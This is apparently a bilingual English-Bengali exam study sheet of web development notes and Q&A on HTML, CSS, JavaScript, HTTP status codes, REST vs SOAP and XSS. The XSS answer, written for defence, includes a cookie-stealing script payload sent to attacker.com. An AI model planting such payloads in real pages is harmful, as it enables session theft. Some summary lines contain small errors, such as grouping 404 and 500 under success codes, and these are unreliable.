mustKnow.en: HTML (HyperText Markup Language): the standard language for creating web pages. Uses tags enclosed in angle brackets. HTML5 is the current version. File extension: `.html` or `.htm`.
mustKnow.bn: HTML (HyperText Markup Language): web page তৈরির standard language। Angle bracket-এ enclosed tags ব্যবহার করে। HTML5 বর্তমান version। File extension: `.html` বা `.htm`।

mustKnow.en: HTML5 semantic tags: `<header>`, `<footer>`, `<nav>`, `<section>`, `<article>`, `<aside>`, `<main>`. These improve readability and SEO by describing page structure meaningfully.
mustKnow.bn: HTML5 semantic tags: `<header>`, `<footer>`, `<nav>`, `<section>`, `<article>`, `<aside>`, `<main>`। এগুলো meaningfully page structure বর্ণনা করে readability ও SEO উন্নত করে।

mustKnow.en: HTML form elements: `<input type='text'>` (text box), `<input type='checkbox'>` (checkbox), `<input type='radio'>` (radio button), `<select>` (dropdown), `<textarea>` (multi-line text), `<button>` (button). Form submits data to server via `action` and `method` attributes.
mustKnow.bn: HTML form elements: `<input type='text'>` (text box), `<input type='checkbox'>` (checkbox), `<input type='radio'>` (radio button), `<select>` (dropdown), `<textarea>` (multi-line text), `<button>` (button)। Form `action` ও `method` attribute দিয়ে server-এ data submit করে।

mustKnow.en: CSS (Cascading Style Sheets): a language for styling HTML. Controls layout, colors, fonts, spacing. Three ways to apply CSS: Inline (style attribute), Internal (`<style>` in `<head>`), External (separate .css file linked via `<link>`).
mustKnow.bn: CSS (Cascading Style Sheets): HTML styling-এর জন্য একটি language। Layout, colors, fonts, spacing নিয়ন্ত্রণ করে। CSS apply করার তিনটি উপায়: Inline (style attribute), Internal (`<head>`-এ `<style>`), External (`<link>` দিয়ে সংযুক্ত আলাদা .css file)।

mustKnow.en: CSS Box Model (from inside out): Content → Padding (space inside border) → Border → Margin (space outside border). `padding` adds space between content and border; `margin` adds space between elements.
mustKnow.bn: CSS Box Model (ভেতর থেকে বাইরে): Content → Padding (border-এর ভেতরে space) → Border → Margin (border-এর বাইরে space)। `padding` content ও border-এর মধ্যে space যোগ করে; `margin` elements-এর মধ্যে space যোগ করে।

mustKnow.en: CSS selectors: element (`p { }`), class (`.classname { }`), ID (`#id { }`). CSS frameworks: Bootstrap, Tailwind CSS, Foundation. Framework = pre-written CSS classes for faster development.
mustKnow.bn: CSS selectors: element (`p { }`), class (`.classname { }`), ID (`#id { }`). CSS frameworks: Bootstrap, Tailwind CSS, Foundation। Framework = দ্রুত development-এর জন্য pre-written CSS classes।

mustKnow.en: JavaScript (JS): the programming language of the web. Runs in the browser. Used for: dynamic content, form validation, event handling, DOM manipulation. Added to HTML via `<script>` tag.
mustKnow.bn: JavaScript (JS): web-এর programming language। Browser-এ চলে। ব্যবহার: dynamic content, form validation, event handling, DOM manipulation। HTML-এ `<script>` tag দিয়ে যোগ করা হয়।

mustKnow.en: JavaScript `==` vs `===`: `==` (loose equality) compares values after type conversion (5 == '5' is true). `===` (strict equality) compares value AND type without conversion (5 === '5' is false). Always prefer `===` to avoid bugs.
mustKnow.bn: JavaScript `==` vs `===`: `==` (loose equality) type conversion-এর পরে values তুলনা করে (5 == '5' true)। `===` (strict equality) conversion ছাড়াই value এবং type তুলনা করে (5 === '5' false)। Bug এড়াতে সবসময় `===` পছন্দ করুন।

mustKnow.en: HTTP (HyperText Transfer Protocol): application-layer protocol for transferring web content. Stateless. Client sends Request → Server sends Response. HTTPS = HTTP + SSL/TLS encryption.
mustKnow.bn: HTTP (HyperText Transfer Protocol): web content transfer-এর জন্য application-layer protocol। Stateless। Client Request পাঠায় → Server Response পাঠায়। HTTPS = HTTP + SSL/TLS encryption।

mustKnow.en: HTTP methods: GET (retrieve data — no body), POST (submit data), PUT (update entire resource), PATCH (partial update), DELETE (remove resource). GET parameters are in URL; POST parameters are in body.
mustKnow.bn: HTTP methods: GET (data retrieve করা — কোনো body নেই), POST (data submit করা), PUT (পুরো resource update করা), PATCH (partial update), DELETE (resource সরানো)। GET parameters URL-এ; POST parameters body-তে।

mustKnow.en: HTTP status codes: 1xx (informational), 2xx (success: 200 OK, 201 Created), 3xx (redirection: 301 Moved Permanently, 302 Found), 4xx (client error: 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found), 5xx (server error: 500 Internal Server Error).
mustKnow.bn: HTTP status codes: 1xx (informational), 2xx (success: 200 OK, 201 Created), 3xx (redirection: 301 Moved Permanently, 302 Found), 4xx (client error: 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found), 5xx (server error: 500 Internal Server Error)।

mustKnow.en: URL (Uniform Resource Locator): address of a web resource. Structure: `scheme://host:port/path?query#fragment`. Example: `https://www.example.com:443/page?id=1#section`.
mustKnow.bn: URL (Uniform Resource Locator): web resource-এর ঠিকানা। Structure: `scheme://host:port/path?query#fragment`। উদাহরণ: `https://www.example.com:443/page?id=1#section`।

mustKnow.en: Static website: pre-built HTML/CSS files, same content for all users. Fast, simple, no server processing. Dynamic website: server generates HTML per request (e.g. from database). Personalised content, requires backend. Examples: Static = portfolio; Dynamic = banking portal.
mustKnow.bn: Static website: pre-built HTML/CSS files, সব user-এর জন্য একই content। দ্রুত, সহজ, কোনো server processing নেই। Dynamic website: server প্রতিটি request-এ HTML তৈরি করে (যেমন database থেকে)। Personalised content, backend প্রয়োজন। উদাহরণ: Static = portfolio; Dynamic = banking portal।

mustKnow.en: REST (Representational State Transfer): architectural style for APIs. Uses HTTP methods (GET/POST/PUT/DELETE) and JSON. Stateless, lightweight. SOAP: protocol using XML envelopes. SOAP is more rigid but has built-in security (WS-Security). REST is preferred for web/mobile apps; SOAP for enterprise/financial transactions.
mustKnow.bn: REST (Representational State Transfer): API-র জন্য architectural style। HTTP methods (GET/POST/PUT/DELETE) এবং JSON ব্যবহার করে। Stateless, lightweight। SOAP: XML envelopes ব্যবহারকারী protocol। SOAP আরো rigid কিন্তু built-in security আছে (WS-Security)। REST web/mobile apps-এর জন্য পছন্দের; SOAP enterprise/financial transactions-এর জন্য।

mustKnow.en: DOM (Document Object Model): tree-based representation of an HTML document. JavaScript uses DOM to dynamically access and modify HTML elements. `document.getElementById('id')` selects an element; `.innerHTML` changes its content.
mustKnow.bn: DOM (Document Object Model): HTML document-এর tree-based representation। JavaScript DOM ব্যবহার করে HTML elements dynamically access ও modify করে। `document.getElementById('id')` একটি element select করে; `.innerHTML` এর content পরিবর্তন করে।

mustKnow.en: XSS (Cross-Site Scripting): a web security vulnerability where an attacker injects malicious JavaScript into a web page viewed by other users. Can steal cookies, session tokens. Prevention: sanitise/escape user input before rendering.
mustKnow.bn: XSS (Cross-Site Scripting): একটি web security vulnerability যেখানে attacker অন্য users-এর দেখা web page-এ malicious JavaScript inject করে। Cookies, session tokens চুরি করতে পারে। প্রতিরোধ: render করার আগে user input sanitise/escape করুন।

mustKnow.en: Web server vs Application server: Web server (Apache, Nginx) serves static files (HTML, CSS, images). Application server (Tomcat, JBoss, Node.js) executes application code and generates dynamic content. PHP is a server-side scripting language, NOT a web server.
mustKnow.bn: Web server vs Application server: Web server (Apache, Nginx) static files (HTML, CSS, images) serve করে। Application server (Tomcat, JBoss, Node.js) application code execute করে এবং dynamic content তৈরি করে। PHP হলো server-side scripting language, web server নয়।

mustKnow.en: HTML hyperlink: `link text`. Opens in same tab by default. `target='_blank'` opens in new tab. Can link to: external URL, internal page, email (`mailto:`), phone (`tel:`), or anchor (`#section`).
mustKnow.bn: HTML hyperlink: `link text`। ডিফল্টে same tab-এ খোলে। `target='_blank'` নতুন tab-এ খোলে। link করতে পারে: external URL, internal page, email (`mailto:`), phone (`tel:`), বা anchor (`#section`)।

question.en: Write JavaScript so that for x = 1 to 9, it prints 'x is an odd value.' or 'x is an even value.'
question.bn: JavaScript লিখুন যাতে x = 1 থেকে 9-এর জন্য 'x is an odd value.' বা 'x is an even value.' প্রিন্ট করে।

working.en: for (let x = 1; x <= 9; x++) { if (x % 2 !== 0) { console.log(x + ' is an odd value.'); } else { console.log(x + ' is an even value.'); } }
working.bn: for (let x = 1; x <= 9; x++) { if (x % 2 !== 0) { console.log(x + ' is an odd value.'); } else { console.log(x + ' is an even value.'); } }

example.answer: Uses modulo: x % 2 !== 0 → odd; else even. Output: 1 is an odd value. 2 is an even value. ... 9 is an odd value.

traps.en: PHP is NOT a web server. PHP (Hypertext Preprocessor) is a server-side scripting language. Apache, Nginx, and Tomcat are web servers. A common MCQ trap: 'Which is NOT a web server? Apache / PHP / Tomcat' — answer is PHP.
traps.bn: PHP web server নয়। PHP (Hypertext Preprocessor) হলো server-side scripting language। Apache, Nginx এবং Tomcat হলো web server। একটি সাধারণ MCQ trap: 'কোনটি web server নয়? Apache / PHP / Tomcat' — উত্তর PHP।

traps.en: `==` vs `===` in JavaScript: `5 == '5'` is TRUE (loose, coerces types). `5 === '5'` is FALSE (strict, no coercion). Many coaching books get this wrong by saying `===` is 'equal to' — it checks both value AND type.
traps.bn: JavaScript-এ `==` vs `===`: `5 == '5'` TRUE (loose, types coerce করে)। `5 === '5'` FALSE (strict, কোনো coercion নেই)। অনেক coaching book এটি ভুল করে `===`-কে 'equal to' বলে — এটি value এবং type উভয়ই পরীক্ষা করে।

traps.en: CSS padding vs margin: padding is INSIDE the border (between content and border). Margin is OUTSIDE the border (between elements). Padding affects background color; margin does not.
traps.bn: CSS padding vs margin: padding border-এর ভেতরে (content ও border-এর মধ্যে)। Margin border-এর বাইরে (elements-এর মধ্যে)। Padding background color প্রভাবিত করে; margin করে না।

traps.en: HTTP GET vs POST: GET passes data in URL (visible, bookmarkable, length-limited). POST passes data in request body (not in URL, can handle large data). GET is for reading; POST is for creating/modifying.
traps.bn: HTTP GET vs POST: GET URL-এ data পাঠায় (দৃশ্যমান, bookmarkable, length-সীমিত)। POST request body-তে data পাঠায় (URL-এ নেই, বড় data handle করতে পারে)। GET reading-এর জন্য; POST creating/modifying-এর জন্য।

traps.en: 404 vs 403 vs 401: 404 = Not Found (page doesn't exist). 403 = Forbidden (page exists but you don't have permission). 401 = Unauthorized (authentication required — you're not logged in). All three are client errors (4xx).
traps.bn: 404 vs 403 vs 401: 404 = Not Found (page নেই)। 403 = Forbidden (page আছে কিন্তু আপনার permission নেই)। 401 = Unauthorized (authentication প্রয়োজন — আপনি logged in নন)। তিনটিই client error (4xx)।

traps.en: Static vs Dynamic website: a static site serves the same files to everyone; a dynamic site queries a database and generates HTML per user. A static site CAN use JavaScript in the browser — it is still static because the server sends fixed files.
traps.bn: Static vs Dynamic website: static site সবার কাছে একই files serve করে; dynamic site database query করে এবং প্রতিটি user-এর জন্য HTML তৈরি করে। Static site browser-এ JavaScript ব্যবহার করতে পারে — server fixed files পাঠায় বলে এটি এখনও static।

en: CSS definition: Cascading Style Sheets — language for styling HTML documents. Controls appearance (color, font, layout, spacing).
CSS Box Model (from inside out): Content → Padding → Border → Margin.
Padding: space between content and border (inside). Affects background color.
Margin: space outside the border (between elements). Transparent.
Three ways to use CSS: Inline (style=''), Internal (<style> in <head>), External (<link rel='stylesheet'>).
CSS frameworks: Bootstrap, Tailwind CSS — pre-written CSS classes for rapid development.
Code: p { background-color: blue; color: white; padding: 20px; margin: 10px; }
bn: CSS সংজ্ঞা: Cascading Style Sheets — HTML documents styling-এর language। Appearance নিয়ন্ত্রণ করে (color, font, layout, spacing)।
CSS Box Model (ভেতর থেকে বাইরে): Content → Padding → Border → Margin।
Padding: content ও border-এর মধ্যে space (ভেতরে)। Background color প্রভাবিত করে।
Margin: border-এর বাইরে space (elements-এর মধ্যে)। Transparent।

question.en: What are the HTTP status codes? List the five categories with examples. What is the difference between HTTP GET and POST methods? What is HTTPS?
question.bn: HTTP status codes কী? উদাহরণসহ পাঁচটি category তালিকা করুন। HTTP GET ও POST method-এর মধ্যে পার্থক্য কী? HTTPS কী?

en: HTTP = HyperText Transfer Protocol. Application-layer protocol for transferring web content. Client-server model. Stateless.

5 status code categories: 1xx (Informational), 2xx (Success — 200 OK, 201 Created), 3xx (Redirection — 301 Moved Permanently, 302 Found), 4xx (Client Error — 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found), 5xx (Server Error — 500 Internal Server Error, 503 Service Unavailable).
GET: retrieves data. Parameters in URL. Can be bookmarked. Safe, idempotent. Limited data size.
POST: submits data to server. Parameters in request body. Not bookmarkable. Can send large/binary data. Used for form submission, file upload.
HTTPS = HTTP + SSL/TLS encryption. Port 443 (HTTP uses 80). Protects data in transit. Required for banking, login pages.
bn: HTTP = HyperText Transfer Protocol। Web content transfer-এর জন্য application-layer protocol। Client-server model। Stateless।

5টি status code category: 1xx (Informational), 2xx (Success — 200 OK, 201 Created), 3xx (Redirection — 301 Moved Permanently, 302 Found), 4xx (Client Error — 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found), 5xx (Server Error — 500 Internal Server Error, 503 Service Unavailable)।
GET: data retrieve করে। Parameters URL-এ। Bookmark করা যায়। Safe, idempotent। সীমিত data size।
POST: Server-এ data submit করে। Parameters request body-তে। Bookmark করা যায় না। বড়/binary data পাঠাতে পারে। Form submission, file upload-এর জন্য ব্যবহৃত।
HTTPS = HTTP + SSL/TLS encryption। Port 443 (HTTP port 80 ব্যবহার করে)। Transit-এ data রক্ষা করে। Banking, login page-এর জন্য প্রয়োজন।

5.en: 1xx=Informational, 2xx=Success (200 OK, 404=Not Found, 500=Server Error). GET=parameters in URL, can bookmark; POST=parameters in body, can't bookmark. HTTPS=HTTP+TLS encryption, port 443.
5.bn: 1xx=Informational, 2xx=Success (200 OK, 404=Not Found, 500=Server Error)। GET=URL-এ parameters, bookmark করা যায়; POST=body-তে parameters, bookmark করা যায় না। HTTPS=HTTP+TLS encryption, port 443।

q.en: What is the difference between `==` and `===` in JavaScript?

a.en: `==` (loose/abstract equality) compares values after type coercion: `5 == '5'` is true because '5' is converted to 5. `===` (strict equality) compares both value AND type without coercion: `5 === '5'` is false because one is number and the other is string. Always use `===` in production code to avoid unexpected bugs.
a.bn: `==` (loose/abstract equality) type coercion-এর পরে values তুলনা করে: `5 == '5'` true কারণ '5' 5-এ convert হয়। `===` (strict equality) coercion ছাড়াই value AND type উভয়ই তুলনা করে: `5 === '5'` false কারণ একটি number ও অপরটি string। অপ্রত্যাশিত bug এড়াতে production code-এ সবসময় `===` ব্যবহার করুন।

q.en: What is the difference between padding and margin in CSS?
q.bn: CSS-এ padding ও margin-এর মধ্যে পার্থক্য কী?

a.en: Padding is the space INSIDE the border — between the element's content and its border. It inherits the background color of the element. Margin is the space OUTSIDE the border — between the element and neighbouring elements. Margin is always transparent. Example: `padding: 20px` makes the content 20px from the edge; `margin: 10px` keeps 10px between this element and others.
a.bn: Padding হলো border-এর ভেতরের space — element-এর content ও এর border-এর মধ্যে। এটি element-এর background color inherit করে। Margin হলো border-এর বাইরের space — element ও পাশের elements-এর মধ্যে। Margin সর্বদা transparent। উদাহরণ: `padding: 20px` content-কে edge থেকে 20px রাখে; `margin: 10px` এই element ও অন্যদের মধ্যে 10px রাখে।

q.en: What is the CSS Box Model?

a.en: The CSS Box Model describes how every HTML element is rendered as a rectangular box with four layers (from inside out): (1) Content — the actual text/image; (2) Padding — transparent space between content and border; (3) Border — the outline of the element; (4) Margin — transparent space between this element and others. The total element width = content + padding-left + padding-right + border-left + border-right + margin-left + margin-right.
a.bn: CSS Box Model বর্ণনা করে কীভাবে প্রতিটি HTML element চারটি layer সহ একটি rectangular box হিসেবে render হয় (ভেতর থেকে বাইরে): (1) Content — actual text/image; (2) Padding — content ও border-এর মধ্যে transparent space; (3) Border — element-এর outline; (4) Margin — এই element ও অন্যদের মধ্যে transparent space। মোট element width = content + padding-left + padding-right + border-left + border-right + margin-left + margin-right।

q.en: What is the difference between REST and SOAP?
q.bn: REST ও SOAP-এর মধ্যে পার্থক্য কী?

a.en: REST (Representational State Transfer): architectural style using HTTP methods (GET/POST/PUT/DELETE), data in JSON or XML, stateless, lightweight, easy to use. SOAP (Simple Object Access Protocol): a protocol using XML envelopes, strict contract (WSDL), built-in security (WS-Security), used in legacy enterprise and banking integrations. Main difference in data exchange: REST uses plain JSON; SOAP wraps everything in XML envelopes with headers and body. Enterprises and banks choose SOAP where a strict contract and WS-Security are required.
a.bn: REST (Representational State Transfer): HTTP methods (GET/POST/PUT/DELETE), JSON বা XML-এ data, stateless, lightweight, ব্যবহার সহজ। SOAP (Simple Object Access Protocol): XML envelopes ব্যবহারকারী protocol, strict contract (WSDL), built-in security (WS-Security), পুরোনো enterprise ও banking integration-এ ব্যবহৃত। Data exchange-এ মূল পার্থক্য: REST plain JSON ব্যবহার করে; SOAP সব কিছু headers ও body সহ XML envelopes-এ wrap করে। যেখানে strict contract ও WS-Security দরকার, সেখানে enterprise ও ব্যাংক SOAP বেছে নেয়।

q.en: What is XSS and how can it be prevented?
q.bn: XSS কী এবং এটি কীভাবে প্রতিরোধ করা যায়?

a.en: XSS (Cross-Site Scripting) is a web security vulnerability where an attacker injects malicious JavaScript into a web page viewed by other users. For example, storing `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>` in a form that others view — their cookies are sent to the attacker. Prevention: (1) Sanitise and escape all user input before rendering (HTML-encode `<`, `>`, `&`). (2) Use Content Security Policy (CSP) headers. (3) Use HttpOnly flag on cookies so JavaScript cannot read them.
a.bn: XSS (Cross-Site Scripting) হলো একটি web security vulnerability যেখানে attacker অন্য users-এর দেখা web page-এ malicious JavaScript inject করে। উদাহরণ, অন্যরা যে form দেখে সেখানে `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>` সংরক্ষণ করা — তাদের cookies attacker-এর কাছে পাঠানো হয়। প্রতিরোধ: (1) Render করার আগে সব user input sanitise ও escape করুন (HTML-encode `<`, `>`, `&`)। (2) Content Security Policy (CSP) headers ব্যবহার করুন। (3) Cookies-এ HttpOnly flag ব্যবহার করুন যাতে JavaScript পড়তে না পারে।

answer.en: Key HTTP status codes: 200 OK (request succeeded), 201 Created (resource created), 301 Moved Permanently (resource moved, update bookmarks), 302 Found (temporary redirect), 400 Bad Request (malformed syntax), 401 Unauthorized (login required), 403 Forbidden (no permission), 404 Not Found (resource doesn't exist), 500 Internal Server Error (server crashed), 503 Service Unavailable (overloaded).
